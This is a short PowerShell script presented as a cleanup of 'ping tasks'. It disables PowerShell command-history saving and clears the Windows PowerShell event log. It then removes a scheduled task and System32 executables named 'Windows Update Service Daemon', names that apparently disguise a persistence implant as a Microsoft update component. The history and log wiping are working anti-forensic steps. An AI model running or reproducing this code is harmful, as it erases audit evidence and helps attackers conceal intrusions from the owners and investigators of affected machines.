<# script to cleanup ping tasks. #>
# variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$pingdaemontask = "Windows Update Service Daemon"
$pingexepaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe")

# task removal.
Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false -ErrorAction SilentlyContinue

# directory removal
foreach ($file in $pingexepaths) {
    if (Test-Path $file) {
        Remove-Item $file -Force -Confirm:$false
    }
}